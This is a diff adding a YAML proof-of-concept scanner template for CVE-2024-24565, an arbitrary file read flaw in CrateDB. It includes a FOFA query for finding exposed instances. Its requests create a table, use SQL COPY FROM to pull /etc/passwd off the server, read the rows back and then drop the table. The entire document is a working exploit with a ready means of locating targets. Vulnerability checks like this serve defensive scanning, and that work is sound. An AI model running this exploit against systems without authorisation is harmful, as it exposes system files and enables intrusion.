@@ -1,0 +1,48 @@
+id: poc-yaml-cratedb-sql-anyfile-read
+info:
+  name: CrateDB数据库 sql 任意文件读取漏洞(CVE-2024-24565)
+  severity: medium
+  tags:
+  - CVE-2024-24565
+  - 任意文件或目录访问
+  finger: cratedb
+  fofa: body="CrateDB"
+variables:
+  table_name: concat("a",random_str(5))
+requests:
+- method: POST
+  path: /_sql?types
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"stmt":"CREATE TABLE {{.table_name}}({{.table_name}} STRING)"}'
+  expression: status_code == 200
+- method: POST
+  path: /_sql?types
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"stmt":"COPY {{.table_name}} FROM ''/etc/passwd'' with (format=''csv'',
+    header=false)"}'
+  expression: status_code == 200
+- method: POST
+  path: /_sql?types
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"stmt":"SELECT * FROM {{.table_name}} LIMIT 100"}'
+  expression: 'status_code == 200 &&
+
+    contains(body,"/bin") &&
+
+    contains(body,"root:") &&
+
+    !contains(body,"<") &&
+
+    contains(headers,"application/json")
+
+    '
+- method: POST
+  path: /_sql?types
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"stmt":"DROP TABLE {{.table_name}}"}'
+  expression: status_code == 200
+transport: http
